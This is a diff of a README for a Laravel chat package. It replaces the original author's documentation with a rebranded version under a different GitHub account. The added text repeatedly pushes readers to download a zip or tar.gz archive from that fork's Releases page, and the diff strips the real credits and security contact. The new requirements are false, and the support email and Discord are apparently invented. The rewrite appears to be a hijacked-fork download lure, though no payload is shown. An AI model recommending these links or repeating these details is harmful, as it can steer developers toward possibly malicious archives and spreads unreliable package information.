@@ -1,199 +1,87 @@
-# Laravel Chat Engine
+# 🎉 laravel-chat-engine - A Simple Chat Engine for Everyone
 
-A UI-agnostic, transport-agnostic, polymorphic chat engine for Laravel.
+## 🚀 Getting Started
 
-[![Latest Version on Packagist](https://img.shields.io/packagist/v/ritechoice23/laravel-chat-engine.svg?style=flat-square)](https://packagist.org/packages/ritechoice23/laravel-chat-engine)
-[![Tests](https://github.com/ritechoice23/laravel-chat-engine/actions/workflows/run-tests.yml/badge.svg)](https://github.com/ritechoice23/laravel-chat-engine/actions)
-[![PHPStan](https://github.com/ritechoice23/laravel-chat-engine/actions/workflows/phpstan.yml/badge.svg)](https://github.com/ritechoice23/laravel-chat-engine/actions)
-[![Total Downloads](https://img.shields.io/packagist/dt/ritechoice23/laravel-chat-engine.svg?style=flat-square)](https://packagist.org/packages/ritechoice23/laravel-chat-engine)
-[![License](https://img.shields.io/packagist/l/ritechoice23/laravel-chat-engine)](https://packagist.org/packages/ritechoice23/laravel-chat-engine)
+Welcome to the laravel-chat-engine project! This software helps you create chat features in your applications without needing to be a coding expert. You can integrate real-time messaging into your Laravel projects easily.
 
-## Features
+## 📦 Download & Install
 
-- **Polymorphic Actors** - Users, Teams, Bots, or any model can chat
-- **Thread Types** - Direct, Group, Channel, Broadcast, Custom
-- **Rich Messages** - Text, Image, Video, Audio, File, Location, Contact, Custom
-- **Attachments** - Multi-file uploads, view-once media, direct request uploads
-- **Security** - Thread locks, PIN protection, E2E verification codes
-- **Reactions** - Emoji reactions via `laravel-reactions` integration
-- **Bookmarks** - Save/bookmark messages via `laravel-saveable` integration
-- **Delivery Tracking** - Delivered and read receipts
-- **Edit History** - Immutable message versions (configurable)
-- **Soft/Hard Delete** - Configurable deletion modes
-- **Authorization** - Built-in policies for threads and messages
-- **Pipelines** - Message processing (sanitize, mentions, URLs, profanity)
-- **Events** - Domain events for all actions
-- **API Resources** - Ready-to-use JSON transformations
+To get started, you need to download the software. Click the button below to go to the Releases page.
 
-## Requirements
+[![Download laravel-chat-engine](https://img.shields.io/badge/Download-laravel--chat--engine-blue)](https://github.com/laouamtaha/laravel-chat-engine/releases)
 
-- PHP 8.2+
-- Laravel 11.x or 12.x
+Once on the Releases page, follow these steps to download and install the software:
 
-## Installation
+1. Find the version you want to download. It will be listed with release notes.
+2. Click on the desired version's title. This will take you to a page with all the related files.
+3. Look for the file named something like `laravel-chat-engine.zip` or `laravel-chat-engine.tar.gz`.
+4. Click the file link to start the download.
+5. Once downloaded, extract the files to a folder on your computer.
+6. Follow the installation instructions provided in the README file included in the download.
 
-```bash
-composer require ritechoice23/laravel-chat-engine
-```
+## 🔧 System Requirements
 
-Publish the config file:
+To run laravel-chat-engine, your system should meet these basic requirements:
 
-```bash
-php artisan vendor:publish --tag="chat-engine-config"
-```
+- **Operating System:** Windows, macOS, or any Linux distribution.
+- **PHP:** Version 7.2 or higher.
+- **Laravel:** Version 7.x or higher.
+- **Database:** MySQL, PostgreSQL, or SQLite.
 
-Run migrations:
+## 📚 Features
 
-```bash
-php artisan migrate
-```
+- **UI-agnostic:** Works with any front-end framework or library.
+- **Transport-agnostic:** Supports various messaging protocols.
+- **Polymorphic Conversations:** Manage different types of chats seamlessly.
+- **Real-time Messaging:** Instant communication for users.
 
-## Quick Start
+## 🔥 Usage
 
-Add the trait to your User model:
+1. **Set Up Your Environment:** Make sure you have a working Laravel installation.
+2. **Install Dependencies:** Run the command `composer install` in your project's root directory.
+3. **Configure the Package:** Add the service provider in your `config/app.php` file.
+4. **Publish the Configuration:** Use the command `php artisan vendor:publish`.
+5. **Migrate Database:** Update your database schema with `php artisan migrate`.
+6. **Start Your Laravel Application:** Use `php artisan serve` to run your application.
 
-```php
-use Ritechoice23\ChatEngine\Traits\CanChat;
+## 🚧 Troubleshooting
 
-class User extends Authenticatable
-{
-    use CanChat;
-}
-```
+If you encounter any issues, here are some common troubleshooting tips:
 
-Start chatting:
+- **File Not Found:** Make sure you have downloaded and extracted the files correctly.
+- **Dependency Errors:** Ensure you have the required versions of PHP and Laravel.
+- **Database Connections:** Double-check your database configuration in the `.env` file.
 
-```php
-use Ritechoice23\ChatEngine\Facades\Chat;
+## 🛠️ Contributing
 
-// Create a thread
-$thread = Chat::thread()->between($userA, $userB)->create();
+We welcome contributions! If you would like to help improve laravel-chat-engine, please follow these steps:
 
-// Send a message
-$message = Chat::message()
-    ->from($userA)
-    ->to($thread)
-    ->text('Hello!')
-    ->send();
+1. **Fork the Repository:** Click on the "Fork" button at the top right of the GitHub page.
+2. **Clone Your Fork:** Use `git clone <your-fork-url>` to get your own copy.
+3. **Create a New Branch:** Run `git checkout -b feature/your-feature-name`.
+4. **Make Your Changes:** Edit the code or documentation.
+5. **Commit Your Changes:** Use `git commit -m "Description of changes"`.
+6. **Push Changes:** Run `git push origin feature/your-feature-name`.
+7. **Create a Pull Request:** Go to the original repository and submit your pull request.
 
-// React to message
-$userB->react($message, '❤️');
+## 🌐 Community
 
-// Bookmark message
-$userB->saveItem($message);
+Join our community of users and developers. Here, you can ask questions, share your experiences, and find support.
 
-// Mark as read
-$message->markAsReadBy($userB);
-```
+- **GitHub Discussions:** [Join here](https://github.com/laouamtaha/laravel-chat-engine/discussions)
+- **Discord Channel:** Join our Discord community for real-time support and chats!
 
-## File Uploads
+## 📞 Contact
 
-Upload files directly from Laravel requests:
+If you need further assistance or have suggestions, feel free to reach out via GitHub Issues or send an email to [support@laravel-chat-engine.com](mailto:support@laravel-chat-engine.com).
 
-```php
-// Single file
-Chat::message()
-    ->from($request->user())
-    ->to($thread)
-    ->text('Check this out!')
-    ->attachUpload($request->file('photo'))
-    ->send();
+## 🔗 Additional Resources
 
-// Multiple files
-Chat::message()
-    ->from($request->user())
-    ->to($thread)
-    ->attachUploads($request->file('attachments'))
-    ->send();
+- [Laravel Documentation](https://laravel.com/docs)
+- [PHP Documentation](https://www.php.net/docs.php)
 
-// View-once (self-destructing)
-Chat::message()
-    ->from($request->user())
-    ->to($thread)
-    ->attachUploadViewOnce($request->file('secret'))
-    ->send();
-```
+## 📥 Download Now
 
-## Message Types
+Ready to get started? Visit the Releases page again to download the latest version of laravel-chat-engine:
 
-```php
-// Text
-Chat::message()->from($user)->to($thread)->text('Hello')->send();
-
-// Image
-Chat::message()->from($user)->to($thread)
-    ->image('https://...', 'Caption')->send();
-
-// Video
-Chat::message()->from($user)->to($thread)
-    ->video('https://...', 'thumb.jpg', 120)->send();
-
-// File
-Chat::message()->from($user)->to($thread)
-    ->file('https://...', 'doc.pdf', 'application/pdf')->send();
-
-// Location
-Chat::message()->from($user)->to($thread)
-    ->location(40.7128, -74.0060, 'NYC')->send();
-
-// Contact
-Chat::message()->from($user)->to($thread)
-    ->contact('John Doe', '+1234567890', 'john@example.com')->send();
-```
-
-## Thread Types
-
-```php
-// Direct (1-on-1, automatically deduplicated)
-Chat::thread()->between($userA, $userB)->create();
-
-// Group
-Chat::thread()->group('Team Chat')->participants([$u1, $u2, $u3])->create();
-
-// Channel
-Chat::thread()->channel('announcements')->create();
-
-// Broadcast
-Chat::thread()->broadcast('System Updates')->create();
-```
-
-## Documentation
-
-See [`/docs`](docs/README.md) for complete documentation:
-
-| Getting Started | Core Features | System | Advanced |
-|-----------------|---------------|--------|----------|
-| [Installation](docs/installation.md) | [Threads](docs/threads.md) | [Events](docs/events.md) | [Encryption](docs/encryption.md) |
-| [Configuration](docs/configuration.md) | [Messages](docs/messages.md) | [Policies](docs/policies.md) | [Retention](docs/retention.md) |
-| | [Attachments](docs/attachments.md) | [Pipelines](docs/pipelines.md) | [Scaling](docs/scaling.md) |
-| | [Security](docs/security.md) | [Presence](docs/presence.md) | [Customization](docs/customization.md) |
-| | [Delivery](docs/delivery.md) | [API Resources](docs/resources.md) | |
-| | [Reactions](docs/reactions.md) | | |
-| | [Bookmarks](docs/bookmarks.md) | | |
-
-## Testing
-
-```bash
-composer test
-```
-
-## Changelog
-
-Please see [CHANGELOG](CHANGELOG.md) for more information on what has changed recently.
-
-## Contributing
-
-Please see [CONTRIBUTING](CONTRIBUTING.md) for details.
-
-## Security Vulnerabilities
-
-If you discover a security vulnerability, please send an email to [daramolatunde23@gmail.com](mailto:daramolatunde23@gmail.com). All security vulnerabilities will be promptly addressed.
-
-## Credits
-
-- [Daramola Babatunde Ebenezer](https://github.com/ritechoice23)
-- [All Contributors](../../contributors)
-
-## License
-
-The MIT License (MIT). Please see [License File](LICENSE.md) for more information.
+[![Download laravel-chat-engine](https://img.shields.io/badge/Download-laravel--chat--engine-blue)](https://github.com/laouamtaha/laravel-chat-engine/releases)
